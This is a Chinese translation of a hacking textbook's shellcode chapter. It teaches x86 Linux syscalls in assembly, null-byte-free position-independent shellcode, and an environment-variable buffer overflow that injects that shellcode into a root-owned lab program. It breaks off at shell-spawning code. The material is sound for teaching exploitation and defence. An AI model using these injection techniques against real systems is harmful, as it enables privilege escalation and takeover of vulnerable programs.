# 第 0x500 章。脚本代码

到目前为止，我们攻击中使用的脚本代码只是一串复制粘贴的字节。我们看到了用于本地攻击的标准 shell 启动脚本代码和用于远程攻击的端口绑定脚本代码。脚本代码有时也被称为攻击有效载荷，因为这些自包含的程序在程序被黑客攻击后执行实际工作。脚本代码通常启动一个 shell，因为这是一种优雅的控制权移交方式；但它可以做任何程序能做的事情。

不幸的是，对于许多黑客来说，脚本故事在复制粘贴字节的地方就结束了。这些黑客只是触及了可能性的表面。定制的脚本代码让你对被利用的程序有绝对的控制权。也许你希望你的脚本代码向 /etc/passwd 添加管理员账户，或者自动从日志文件中删除行。一旦你学会了如何编写自己的脚本代码，你的攻击手段就只受你的想象力限制了。此外，编写脚本代码可以培养汇编语言技能，并运用许多值得了解的攻击技术。

# 汇编与 C

脚本字节实际上是特定架构的机器指令，因此脚本是用汇编语言编写的。在汇编语言中编写程序与在 C 语言中编写不同，但许多原则是相似的。操作系统在内核中管理诸如输入、输出、进程控制、文件访问和网络通信等事务。编译后的 C 程序最终通过向内核发出系统调用来执行这些任务。不同的操作系统有不同的系统调用集。

在 C 语言中，标准库用于方便和可移植性。一个使用 `printf()` 输出字符串的 C 程序可以编译成许多不同的系统，因为库知道各种架构的适当系统调用。在 *x*86 处理器上编译的 C 程序将产生 *x*86 汇编语言。

根据定义，汇编语言已经针对特定的处理器架构进行了特定化，因此不可移植。没有标准库；相反，必须直接调用内核系统调用。为了开始我们的比较，让我们先写一个简单的 C 程序，然后将其重写为 *x*86 汇编。

## 汇编与 C

### helloworld.c

```
#include <stdio.h>
int main() {
  printf("Hello, world!\n");
  return 0;
}
```

当编译后的程序运行时，执行流程会通过标准 I/O 库，最终通过系统调用将字符串 *Hello, world!* 写入屏幕。strace 程序用于跟踪程序的系统调用。在编译好的 helloworld 程序上使用它，它会显示该程序做出的每一个系统调用。

```
reader@hacking:~/booksrc $ gcc helloworld.c
reader@hacking:~/booksrc $ strace ./a.out
execve("./a.out", ["./a.out"], [/* 27 vars */]) = 0
brk(0)                                  = 0x804a000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ef6000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=61323, ...}) = 0
mmap2(NULL, 61323, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7ee7000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 3
read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20Z\1\000"..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1248904, ...}) = 0
mmap2(NULL, 1258876, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7db3000
mmap2(0xb7ee0000, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3,
 0x12c) =
0xb7ee0000
mmap2(0xb7ee4000, 9596, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) =

0xb7ee4000
close(3)                                = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7db2000
set_thread_area({entry_number:-1 -> 6, base_addr:0xb7db26b0, limit:1048575, seg_32bit:1,
contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
mprotect(0xb7ee0000, 8192, PROT_READ)   = 0
munmap(0xb7ee7000, 61323)               = 0
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 2), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ef5000
`write(1, "Hello, world!\n", 13Hello, world! )          = 13`
exit_group(0)                           = ?
Process 11528 detached
reader@hacking:~/booksrc $
```

如您所见，编译后的程序不仅仅是打印一个字符串。开始处的系统调用是在设置程序的环境和内存，但重要的是显示在粗体中的 `write()` 系统调用。这正是实际输出字符串的地方。

Unix 手册页（通过 `man` 命令访问）分为几个部分。第二部分包含系统调用手册页，因此 `man 2 write` 将描述 `write()` 系统调用的用法：

### `write()` 系统调用手册页

```
WRITE(2)                   Linux Programmer's Manual
WRITE(2)

NAME
       write - write to a file descriptor

SYNOPSIS
       #include <unistd.h>

       ssize_t write(int fd, const void *buf, size_t count);

DESCRIPTION
       write() writes up to count bytes to the file referenced by the file
       descriptor fd from the buffer starting at buf. POSIX requires that a
       read() which can be proved to occur after a write() returns the new
       data. Note that not all file systems are POSIX conforming.
```

strace 输出还显示了系统调用的参数。`buf` 和 `count` 参数是指向我们的字符串及其长度的指针。`fd` 参数的 `1` 是一个特殊的标准文件描述符。文件描述符在 Unix 中用于几乎所有事情：输入、输出、文件访问、网络套接字等。文件描述符类似于在衣帽间领取的号码。打开文件描述符就像登记你的大衣，因为你得到了一个可以后来用来引用你的大衣的号码。前三个文件描述符号码（0、1 和 2）自动用于标准输入、输出和错误。这些值是标准的，并在多个地方定义过，例如在下一页的 `/usr/include/unistd.h` 文件中。

### 来自 /usr/include/unistd.h

```
/* Standard file descriptors. */
#define STDIN_FILENO  0 /* Standard input.  */
#define STDOUT_FILENO 1 /* Standard output.  */
#define STDERR_FILENO 2 /* Standard error output. */
```

将字节写入标准输出的文件描述符 `1` 将打印字节；从标准输入的文件描述符 `0` 读取将输入字节。标准错误文件描述符 `2` 用于显示可以从标准输出过滤的错误或调试消息。

## Linux 系统调用汇编

列出了所有可能的 Linux 系统调用，以便在汇编调用时可以通过数字引用它们。这些系统调用在 `/usr/include/asm-i386/unistd.h` 中列出。

### 来自 /usr/include/asm-i386/unistd.h

```
#ifndef _ASM_I386_UNISTD_H_
#define _ASM_I386_UNISTD_H_

/*
 * This file contains the system call numbers.
 */

#define __NR_restart_syscall      0
`#define __NR_exit       1`
#define __NR_fork       2
#define __NR_read       3
`#define __NR_write      4`
#define __NR_open       5
#define __NR_close      6
#define __NR_waitpid    7
#define __NR_creat      8
#define __NR_link       9
#define __NR_unlink    10
#define __NR_execve    11
#define __NR_chdir     12
#define __NR_time      13
#define __NR_mknod     14
#define __NR_chmod     15
#define __NR_lchown    16
#define __NR_break     17
#define __NR_oldstat   18
#define __NR_lseek     19
#define __NR_getpid    20
#define __NR_mount     21
#define __NR_umount    22
#define __NR_setuid    23
#define __NR_getuid    24
#define __NR_stime     25
#define __NR_ptrace    26
#define __NR_alarm     27
#define __NR_oldfstat  28
#define __NR_pause     29
#define __NR_utime     30
#define __NR_stty      31
#define __NR_gtty      32
#define __NR_access    33
#define __NR_nice      34
#define __NR_ftime     35
#define __NR_sync      36
#define __NR_kill      37
#define __NR_rename    38
#define __NR_mkdir     39
...
```

对于我们用汇编重写的 `helloworld.c`，我们将对 `write()` 函数进行系统调用以输出，然后对 `exit()` 函数进行第二次系统调用，以便进程干净地退出。这可以在 *x*86 汇编中使用仅两个汇编指令来完成：`mov` 和 `int`。

*x*86 处理器的汇编指令有一个、两个、三个或没有操作数。指令的操作数可以是数值、内存地址或处理器寄存器。*x*86 处理器有几个 32 位寄存器，可以视为硬件变量。EAX、EBX、ECX、EDX、ESI、EDI、EBP 和 ESP 寄存器都可以用作操作数，而 EIP 寄存器（执行指针）不能。

`mov` 指令在两个操作数之间复制一个值。使用英特尔汇编语法，第一个操作数是目标，第二个是源。`int` 指令向内核发送一个中断信号，由其单个操作数定义。在 Linux 内核中，中断 `0x80` 用于告诉内核执行系统调用。当执行 `int 0x80` 指令时，内核将根据前四个寄存器执行系统调用。EAX 寄存器用于指定要执行哪个系统调用，而 EBX、ECX 和 EDX 寄存器用于保存系统调用的第一个、第二个和第三个参数。所有这些寄存器都可以使用 `mov` 指令设置。

在下面的汇编代码列表中，内存段被简单地声明。带有换行符（`0x0a`）的字符串`"Hello, world!"`在数据段中，实际的汇编指令在文本段中。这遵循了正确的内存分段实践。

### helloworld.asm

```
section .data       ;  Data segment
msg     db      "Hello,  world!", 0x0a   ;  The string and newline char

section .text       ; Text segment
global _start       ; Default entry point for ELF linking

_start:

; SYSCALL: write(1, msg, 14)
mov eax, 4        ; Put 4 into eax, since write is syscall #4.
mov ebx, 1        ; Put 1 into ebx, since stdout is 1.
mov ecx, msg      ; Put the address of the string into ecx.
mov edx, 14       ; Put 14 into edx, since our string is 14 bytes.
int 0x80          ; Call the kernel to make the system call happen.

; SYSCALL: exit(0)
mov eax, 1        ; Put 1 into eax, since exit is syscall #1.
mov ebx, 0        ; Exit with success.
int 0x80          ; Do the syscall.
```

这个程序的说明非常直接。对于写入标准输出的`write()`系统调用，将`4`的值放入 EAX，因为`write()`函数是系统调用号 4。然后，将`1`的值放入 EBX，因为`write()`的第一个参数应该是标准输出的文件描述符。接下来，将数据段中字符串的地址放入 ECX，并将字符串的长度（在这种情况下，14 个字节）放入 EDX。在这些寄存器被加载后，触发系统调用中断，这将调用`write()`函数。

为了干净地退出，需要用单个参数`0`调用`exit()`函数。因此，将`1`的值放入 EAX，因为`exit()`是系统调用号 1，将`0`的值放入 EBX，因为第一个且唯一的参数应该是 0。然后再次触发系统调用中断。

要创建一个可执行二进制文件，这个汇编代码必须首先被汇编，然后链接成可执行格式。当编译 C 代码时，GCC 编译器会自动处理所有这些。我们将创建一个可执行和链接格式（ELF）的二进制文件，所以`global _start`行告诉链接器汇编指令的开始位置。

使用`-f elf`参数的`nasm`汇编器将`helloworld.asm`汇编成一个准备链接为 ELF 二进制的目标文件。默认情况下，这个目标文件将被称为`helloworld.o`。链接程序 ld 将从汇编的目标文件生成可执行的`a.out`二进制文件。

```
reader@hacking:~/booksrc $ nasm -f elf helloworld.asm
reader@hacking:~/booksrc $ ld helloworld.o
reader@hacking:~/booksrc $ ./a.out
Hello, world!
reader@hacking:~/booksrc $
```

这个小程序可以工作，但它不是 shellcode，因为它不是自包含的，必须进行链接。

# 到 Shellcode 的路径

Shellcode 实际上是注入到一个正在运行的程序中，就像生物病毒在细胞内一样接管。由于 shellcode 实际上不是一个可执行程序，我们没有声明内存中数据布局或使用其他内存段的便利。我们的指令必须是自包含的，并且准备好无论处理器的当前状态如何都能接管处理器控制。这通常被称为位置无关代码。

在 shellcode 中，字符串`"Hello, world!"`的字节必须与汇编指令的字节混合在一起，因为不存在可定义或可预测的内存段。只要 EIP 不尝试将字符串解释为指令，这就可以了。然而，为了将字符串作为数据访问，我们需要一个指向它的指针。当 shellcode 被执行时，它可能在内存中的任何位置。需要计算字符串的绝对内存地址，相对于 EIP。然而，由于 EIP 不能从汇编指令中访问，因此我们需要使用某种技巧。

## 使用堆栈的汇编指令

栈对于*x*86 架构来说是如此重要，以至于有专门的指令用于其操作。

| 指令 | 描述 |
| --- | --- |
| `push <source>` | 将源操作数压入栈中。 |
| `pop <destination>` | 从栈中弹出一个值并将其存储在目标操作数中。 |
| `call <location>` | 调用一个函数，将执行跳转到位置操作数中的地址。这个位置可以是相对的或绝对的。调用之后的指令地址被压入栈中，以便稍后执行返回。 |
| `ret` | 从函数返回，从栈中弹出返回地址并跳转到那里执行。 |

基于栈的漏洞利用是由`call`和`ret`指令实现的。当一个函数被调用时，下一条指令的返回地址被压入栈中，开始栈帧。函数执行完毕后，`ret`指令从栈中弹出返回地址并跳转 EIP 回到那里。通过在`ret`指令之前覆盖存储在栈上的返回地址，我们可以控制程序的执行。

这种架构可以通过另一种方式被滥用来解决内联字符串数据寻址的问题。如果字符串直接放置在调用指令之后，字符串的地址将作为返回地址被压入栈中。而不是调用一个函数，我们可以跳过字符串到一个`pop`指令，该指令将从栈中取出地址并放入寄存器。下面的汇编指令展示了这种技术。

### helloworld1.s

```
BITS 32             ;  Tell nasm this is 32-bit code.

  call mark_below   ;  Call below the string to instructions
  db "Hello, world!",  0x0a, 0x0d  ; with newline and carriage return bytes.

mark_below:
; ssize_t write(int fd,  const void *buf, size_t count);
  pop ecx           ; Pop  the return address (string ptr) into ecx.
  mov eax, 4        ; Write  syscall #.
  mov ebx, 1        ; STDOUT  file descriptor
  mov edx, 15       ; Length of the string
  int 0x80          ; Do syscall: write(1, string, 14)

; void _exit(int status);
  mov eax, 1        ; Exit syscall #
  mov ebx, 0        ; Status = 0
  int 0x80          ; Do syscall:  exit(0)
```

调用指令将执行跳转到字符串下方。这也将下一条指令的地址压入栈中，在我们的例子中是字符串的开始。返回地址可以立即从栈中弹出并放入适当的寄存器。不使用任何内存段，这些原始指令注入到现有进程中将以完全位置无关的方式执行。这意味着，当这些指令被汇编时，它们不能被链接到可执行文件中。

```
reader@hacking:~/booksrc $ nasm helloworld1.s
reader@hacking:~/booksrc $ ls -l helloworld1
-rw-r--r-- 1 reader reader 50 2007-10-26 08:30 helloworld1
reader@hacking:~/booksrc $ hexdump -C helloworld1
00000000  e8 0f 00 00 00 48 65 6c  6c 6f 2c 20 77 6f 72 6c  |.....Hello, worl|
00000010  64 21 0a 0d 59 b8 04 00  00 00 bb 01 00 00 00 ba  |d!..Y...........|
00000020  0f 00 00 00 cd 80 b8 01  00 00 00 bb 00 00 00 00  |................|
00000030  cd 80                                             |..|
00000032
reader@hacking:~/booksrc $ ndisasm -b32 helloworld1
00000000  E80F`000000`        call 0x14
00000005  48                dec eax
00000006  656C              gs insb
00000008  6C                insb
00000009  6F                outsd
0000000A  2C20              sub al,0x20
0000000C  776F              ja 0x7d
0000000E  726C              jc 0x7c
00000010  64210A            and [fs:edx],ecx
00000013  0D59B80400        or eax,0x4b859
00000018  0000              add [eax],al
0000001A  BB01000000        mov ebx,0x1
0000001F  BA0F000000        mov edx,0xf
00000024  CD80              int 0x80
00000026  B801000000        mov eax,0x1
0000002B  BB00000000        mov ebx,0x0
00000030  CD80              int 0x80
reader@hacking:~/booksrc $
```

`nasm`汇编器将汇编语言转换为机器代码，一个相应的工具 ndisasm 将机器代码转换为汇编。这些工具在上文中用于显示机器代码字节和汇编指令之间的关系。加粗的解汇编指令是将`"Hello, world!"`字符串解释为指令的字节。

现在，如果我们能将这个 shellcode 注入到一个程序中并重定向 EIP，程序将打印出*Hello, world!*让我们使用笔记搜索程序的熟悉漏洞目标。

```
reader@hacking:~/booksrc $ export SHELLCODE=$(cat helloworld1)
reader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./notesearch
SHELLCODE will be at 0xbffff9c6
reader@hacking:~/booksrc $ ./notesearch $(perl -e 'print "\xc6\xf9\xff\xbf"x40')
-------[ end of note data ]-------
Segmentation fault
reader@hacking:~/booksrc $
```

失败。你认为它为什么会崩溃？在这种情况下，GDB 是你的最佳朋友。即使你已经知道这次崩溃背后的原因，学习如何有效地使用调试器将有助于你解决未来的许多其他问题。

## 使用 GDB 进行调试

由于 notesearch 程序以 root 身份运行，我们无法以普通用户身份对其进行调试。然而，我们也不能直接附加到正在运行的副本上，因为它退出得太快了。另一种调试程序的方法是使用核心转储。从 root 提示符开始，可以使用命令 `ulimit -c unlimited` 告诉操作系统在程序崩溃时转储内存。这意味着转储的核心文件可以变得任意大。现在，当程序崩溃时，内存将作为核心文件转储到磁盘上，可以使用 GDB 进行检查。

```
reader@hacking:~/booksrc $ sudo su
root@hacking:/home/reader/booksrc # ulimit -c unlimited
root@hacking:/home/reader/booksrc # export SHELLCODE=$(cat helloworld1)
root@hacking:/home/reader/booksrc # ./getenvaddr SHELLCODE ./notesearch
SHELLCODE will be at 0xbffff9a3
root@hacking:/home/reader/booksrc # ./notesearch $(perl -e 'print "\xa3\xf9\
xff\xbf"x40')
-------[ end of note data ]-------
Segmentation fault (core dumped)
root@hacking:/home/reader/booksrc # ls -l ./core
-rw------- 1 root root 147456 2007-10-26 08:36 ./core
root@hacking:/home/reader/booksrc # gdb -q -c ./core
(no debugging symbols found)
Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".
Core was generated by './notesearch
£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E¿£°E.
Program terminated with signal 11, Segmentation fault.
#0  0x2c6541b7 in ?? ()
(gdb) set dis intel
(gdb) x/5i 0xbffff9a3
0xbffff9a3:     call   0x2c6541b7
0xbffff9a8:     ins    BYTE PTR es:[edi],[dx]
0xbffff9a9:     outs   [dx],DWORD PTR ds:[esi]
0xbffff9aa:     sub    al,0x20
0xbffff9ac:     ja     0xbffffa1d
(gdb) i r eip
eip            0x2c6541b7        0x2c6541b7
(gdb) x/32xb 0xbffff9a3
0xbffff9a3:     0xe8    0x0f    0x48    0x65    0x6c    0x6c    0x6f    0x2c
0xbffff9ab:     0x20    0x77    0x6f    0x72    0x6c    0x64    0x21    0x0a
0xbffff9b3:     0x0d    0x59    0xb8    0x04    0xbb    0x01    0xba    0x0f
0xbffff9bb:     0xcd    0x80    0xb8    0x01    0xbb    0xcd    0x80    0x00
(gdb) quit
root@hacking:/home/reader/booksrc # hexdump -C helloworld1
00000000  e8 0f 00 00 00 48 65 6c  6c 6f 2c 20 77 6f 72 6c  |.....Hello, worl|
00000010  64 21 0a 0d 59 b8 04 00  00 00 bb 01 00 00 00 ba  |d!..Y...........|
00000020  0f 00 00 00 cd 80 b8 01  00 00 00 bb 00 00 00 00  |................|
00000030  cd 80                                             |..|
00000032
root@hacking:/home/reader/booksrc #
```

一旦加载 GDB，反汇编风格将切换到 Intel 格式。由于我们以 root 身份运行 GDB，因此不会使用 .gdbinit 文件。将检查放置 shellcode 的内存。指令看起来不正确，但似乎第一个错误的调用指令导致了崩溃。至少，执行被重定向了，但 shellcode 字节出了问题。通常，字符串以空字节结尾，但这里，shell 仁慈地为我们移除了这些空字节。然而，这完全破坏了机器代码的意义。通常，shellcode 会作为字符串注入到进程，使用像 `strcpy()` 这样的函数。这样的函数会在第一个空字节处终止，产生不完整且不可用的 shellcode。为了使 shellcode 能够在传输过程中存活，它必须被重新设计，以确保不包含任何空字节。

## 移除空字节

查看反汇编代码，很明显，第一个空字节来自 `call` 指令。

```
reader@hacking:~/booksrc $ ndisasm -b32 helloworld1
00000000  E80F`000000`        call 0x14
00000005  48                dec eax
00000006  656C              gs insb
00000008  6C                insb
00000009  6F                outsd
0000000A  2C20              sub al,0x20
0000000C  776F              ja 0x7d
0000000E  726C              jc 0x7c
00000010  64210A            and [fs:edx],ecx
00000013  0D59B80400        or eax,0x4b859
00000018  0000              add [eax],al
0000001A  BB01000000        mov ebx,0x1
0000001F  BA0F000000        mov edx,0xf
00000024  CD80              int 0x80
00000026  B801000000        mov eax,0x1
0000002B  BB00000000        mov ebx,0x0
00000030  CD80              int 0x80
reader@hacking:~/booksrc $
```

该指令根据第一个操作数将执行跳转前进了 19 (`0x13`) 个字节。`call` 指令允许更长的跳转距离，这意味着像 19 这样的小值需要用前导零填充，从而产生空字节。

解决这个问题的方法之一是利用二进制补码。一个小负数将它的前导位设置为 1，从而得到 `0xff` 字节。这意味着，如果我们使用负值来向后移动执行，该指令的机器代码将不会包含任何空字节。以下 helloworld shellcode 的修订版本使用了这种技巧的标准实现：跳转到 shellcode 的末尾到一个调用指令，然后该调用指令会跳转回 shellcode 开头的 pop 指令。

### helloworld2.s

```
BITS 32             ;  Tell nasm this is 32-bit code.

`jmp short one       ;  Jump down to a call at the end.  two:`
; ssize_t write(int fd,  const void *buf, size_t count);
  pop ecx           ;  Pop the return address (string ptr) into ecx.
  mov eax, 4        ;  Write syscall #.
  mov ebx, 1        ;  STDOUT file descriptor
  mov edx, 15       ;  Length of the string
  int 0x80          ;  Do syscall: write(1, string, 14)

; void _exit(int status);
  mov eax, 1        ; Exit syscall #
  mov ebx, 0        ; Status = 0
  int 0x80          ; Do syscall: exit(0)

`one:   call two   ; Call back upwards to avoid null bytes   db "Hello, world!", 0x0a, 0x0d ; with newline and carriage return bytes.`
```

在组装这个新的 shellcode 之后，反汇编显示，调用指令（如下所示，用斜体表示）现在没有空字节了。这解决了这个 shellcode 的第一个也是最难解决的问题，但仍然有许多其他的空字节（如下所示，用粗体表示）。

```
reader@hacking:~/booksrc $ nasm helloworld2.s
reader@hacking:~/booksrc $ ndisasm -b32 helloworld2
00000000  EB1E              jmp short 0x20
00000002  59                pop ecx
00000003  B804`000000`        mov eax,0x4
00000008  BB01`000000`        mov ebx,0x1
0000000D  BA0F`000000`        mov edx,0xf
00000012  CD80              int 0x80
00000014  B801`000000`        mov eax,0x1
00000019  BB`00000000`        mov ebx,0x0
0000001E  CD80              int 0x80
*`00000020  E8DDFFFFFF        call 0x2`*
00000025  48                dec eax
00000026  656C              gs insb
00000028  6C                insb
00000029  6F                outsd
0000002A  2C20              sub al,0x20
0000002C  776F              ja 0x9d
0000002E  726C              jc 0x9c
00000030  64210A            and [fs:edx],ecx
00000033  0D                db 0x0D
reader@hacking:~/booksrc $
```

这些剩余的空字节可以通过理解寄存器宽度和寻址来消除。注意，第一个`jmp`指令实际上是`jmp short`。这意味着执行只能向上或向下跳转最多约 128 个字节。正常的`jmp`指令以及调用指令（没有短版本），允许进行更长的跳转。两种跳转类型的汇编代码差异如下所示：

```
	EB 1E              jmp short 0x20
```

相对于

```
	E9 1E 00 00 00     jmp 0x23
```

EAX、EBX、ECX、EDX、ESI、EDI、EBP 和 ESP 寄存器都是 32 位宽。*E*代表*扩展*，因为这些最初是 16 位寄存器，称为 AX、BX、CX、DX、SI、DI、BP 和 SP。这些原始的 16 位寄存器版本仍然可以用来访问每个相应 32 位寄存器的第一个 16 位。此外，AX、BX、CX 和 DX 寄存器的各个字节可以作为 8 位寄存器访问，称为 AL、AH、BL、BH、CL、CH、DL 和 DH，其中*L*代表*低字节*，*H*代表*高字节*。自然地，只使用较小寄存器的汇编指令只需要指定到寄存器位宽度的操作数。下面显示了`mov`指令的三种变体。

| 机代码 | 汇编 |
| --- | --- |
| `B8 04 00 00 00` | `mov eax,0x4` |
| `66 B8 04 00` | `mov ax,0x4` |
| `B0 04` | `mov al,0x4` |

使用 AL、BL、CL 或 DL 寄存器可以将正确的最低有效字节放入相应的扩展寄存器中，而不会在机器代码中创建任何空字节。然而，寄存器的最高三个字节可能包含任何内容。这对于 shellcode 尤其如此，因为它将接管另一个进程。如果我们想使 32 位寄存器值正确，我们需要在`mov`指令之前将整个寄存器清零——但这，同样，不能使用空字节。以下是一些额外的简单汇编指令，供您使用。这些前两个是小的指令，它们将它们的操作数增加或减少 1。

| 指令 | 描述 |
| --- | --- |
| `inc <target>` | 将目标操作数增加 1。 |
| `dec <target>` | 从目标操作数中减去 1。 |

接下来的几条指令，如`mov`指令，有两个操作数。它们都在两个操作数之间执行简单的算术和位逻辑运算，并将结果存储在第一个操作数中。

| 指令 | 描述 |
| --- | --- |
| `add <dest>, <source>` | 将源操作数加到目的操作数上，并将结果存储在目的操作数中。 |
| `sub <dest>, <source>` | 从目的操作数中减去源操作数，并将结果存储在目的操作数中。 |

| `or <dest>, <source>` | 执行位或逻辑运算，比较一个操作数的每个位与另一个操作数对应位的比较。|

| 1 或 0 = 1 |

| 1 或 1 = 1 |

| 0 或 1 = 1 |

| 0 或 0 = 0 |

如果源位或目标位打开，或者两者都打开，结果位打开；否则，结果关闭。最终结果存储在目标操作数中。|

| `and <dest>, <source>` | 执行位运算逻辑操作，比较一个操作数的每个位与另一个操作数的对应位。

| 1 或 0 = 0 | 

| 1 或 1 = 1 | 

| 0 或 1 = 0 | 

| 0 或 0 = 0 | 

只有当源位和目标位都打开时，结果位才打开。最终结果存储在目标操作数中。|

| `xor <dest>, <source>` | 执行位运算排他或（xor）逻辑操作，比较一个操作数的每个位与另一个操作数的对应位。

| 1 或 0 = 1 | 

| 1 或 1 = 0 | 

| 0 或 1 = 1 | 

| 0 或 0 = 0 | 

如果位不同，结果位打开；如果位相同，结果位关闭。最终结果存储在目标操作数中。|

一种方法是将一个任意的 32 位数字移入寄存器，然后使用`mov`和`sub`指令从这个寄存器中减去该值：

```
	B8 44 33 22 11        mov eax,0x11223344
	2D 44 33 22 11        sub eax,0x11223344
```

虽然这个技术可行，但清零单个寄存器需要 10 个字节，使得汇编的 shellcode 比必要的更大。你能想到优化这个技术的方法吗？每个指令中指定的 DWORD 值占代码的 80%。从任何值中减去该值也会产生 0，并且不需要任何静态数据。这可以用一个单字节指令完成：

```
	29 C0               sub eax,eax
```

在 shellcode 开始时清零寄存器时，使用`sub`指令将工作良好。然而，这个指令会修改处理器标志，这些标志用于分支。因此，有一个首选的双字节指令，在大多数 shellcode 中用于清零寄存器。`xor`指令在寄存器的位上执行一个排他或（xor）操作。由于 1 `xor` 1 的结果是 0，0 `xor` 0 的结果也是 0，任何与自身`xor`的值都将得到 0。这与从自身减去任何值得到的结果相同，但`xor`指令不会修改处理器标志，因此被认为是一种更干净的方法。

```
	31 C0                 xor eax,eax
```

你可以安全地使用`sub`指令来清零寄存器（如果是在 shellcode 的开始处执行），但`xor`指令在野外的 shellcode 中最为常用。这个 shellcode 的下一个版本利用了较小的寄存器和`xor`指令来避免空字节。在可能的情况下，也使用了`inc`和`dec`指令，以使 shellcode 更小。

### helloworld3.s

```
BITS 32             ;  Tell nasm this is 32-bit code.

jmp short one       ;  Jump down to a call at the end.

two:
; ssize_t write(int fd,  const void *buf, size_t count);
  pop ecx           ; Pop  the return address (string ptr) into ecx.
  xor eax, eax      ; Zero  out full 32 bits of eax register.
  mov al, 4         ; Write  syscall #4 to the low byte of eax.
  xor ebx, ebx      ; Zero out ebx.
  inc ebx           ; Increment ebx to 1,  STDOUT file descriptor.
  xor edx, edx
  mov dl, 15        ; Length of the string
  int 0x80          ; Do syscall: write(1, string, 14)

; void _exit(int status);
  mov al, 1        ; Exit syscall #1, the top 3 bytes are still zeroed.
  dec ebx          ; Decrement ebx back down to 0 for status = 0.
  int 0x80         ; Do syscall: exit(0)

one:
  call two   ; Call back upwards to avoid null bytes
  db "Hello, world!", 0x0a, 0x0d  ; with newline and carriage return bytes.
```

在汇编这个 shellcode 之后，使用 hexdump 和 grep 来快速检查它是否有空字节。

```
reader@hacking:~/booksrc $ nasm helloworld3.s
reader@hacking:~/booksrc $ hexdump -C helloworld3 | grep --color=auto 00
00000000  eb 13 59 31 c0 b0 04 31  db 43 31 d2 b2 0f cd 80  |..Y1...1.C1.....|
00000010  b0 01 4b cd 80 e8 e8 ff  ff ff 48 65 6c 6c 6f 2c  |..K.......Hello,|
00000020  20 77 6f 72 6c 64 21 0a  0d                       | world!..|
00000029
reader@hacking:~/booksrc $
```

现在这个 shellcode 可以使用了，因为它不包含任何空字节。当与漏洞利用程序一起使用时，notesearch 程序被强制以新手的身份问候世界。

```
reader@hacking:~/booksrc $ export SHELLCODE=$(cat helloworld3)
reader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./notesearch
SHELLCODE will be at 0xbffff9bc
reader@hacking:~/booksrc $ ./notesearch $(perl -e 'print "\xbc\xf9\xff\xbf"x40')
[DEBUG] found a 33 byte note for user id 999
-------[ end of note data ]-------
Hello, world!
reader@hacking :~/booksrc $
```

# Shell-Spawning Shellcode

现在你已经学会了如何进行系统调用并避免空字节，可以构建各种 shellcode。要启动一个 shell，我们只需要调用系统调用来执行/bin/sh shell 程序。系统调用号 11，`execve()`，与我们在前几章中使用的 C 语言`execute()`函数类似。

```
EXECVE(2)                  Linux Programmer's Manual                 EXECVE(2)

NAME
       execve - execute program

SYNOPSIS
       #include <unistd.h>

       int execve(const char *filename, char *const argv[],
                  char *const envp[]);

DESCRIPTION
       execve() executes the program pointed to by filename. Filename must be
       either a binary executable, or a script starting with a line of  the
       form  "#! interpreter [arg]". In the latter case, the interpreter must
       be a valid pathname for an executable which is not itself a  script,
       which will be invoked as interpreter [arg] filename.

       argv is an array of argument strings passed to the new program. envp
       is an array of strings, conventionally of the form key=value, which are
       passed as environment to the new program. Both argv and envp must be
       terminated by a null pointer. The argument vector and environment can
       be accessed by the called program's main function, when it is defined
       as int main(int argc, char *argv[], char *envp[]).
```

文件名的前一个参数应该是字符串`"/bin/sh"`的指针，因为这是我们想要执行的。环境数组（第三个参数）可以空，但仍需要以 32 位空指针结尾。参数数组（第二个参数）也必须是 null 终止的；它还必须包含字符串指针（因为零参数是正在运行的程序的名字）。在 C 中完成这个调用，程序看起来会是这样：

## Shell 启动 Shellcode

### exec_shell.c

```
#include <unistd.h>

int main() {
  char filename[] = "/bin/sh\x00";
  char **argv, **envp; // Arrays that contain char pointers

  argv[0] = filename; // The only argument is filename.
  argv[1] = 0;  // Null terminate the argument array.

  envp[0] = 0; // Null terminate the environment array.

  execve(filename, argv, envp);
}
```

在汇编中做这件事，需要在内存中构建参数数组和环境数组。此外，`"/bin/sh"`字符串需要以空字节结尾。这也必须在内存中构建。在汇编中处理内存类似于在 C 中使用指针。`lea`指令，其名称代表*加载有效地址*，在 C 中类似于`address-of`运算符。

| 指令 | 描述 |
| --- | --- |
| `lea <dest>, <source>` | 将源操作数的有效地址加载到目标操作数。 |

使用 Intel 汇编语法，如果操作数被方括号包围，则可以作为指针解引用。例如，汇编中的以下指令将把 EBX+12 作为指针处理，并将`eax`写入它所指向的位置。

```
	89 43 0C             mov [ebx+12],eax
```

以下 shellcode 使用这些新指令在内存中构建`execve()`参数。环境数组被折叠到参数数组的末尾，因此它们共享同一个 32 位空终止符。

### exec_shell.s

```
BITS 32

  jmp short two     ; Jump down to the bottom for the call trick.
one:
; int execve(const char *filename, char *const argv [], char *const envp[])
  pop ebx           ; Ebx has the addr of the string.
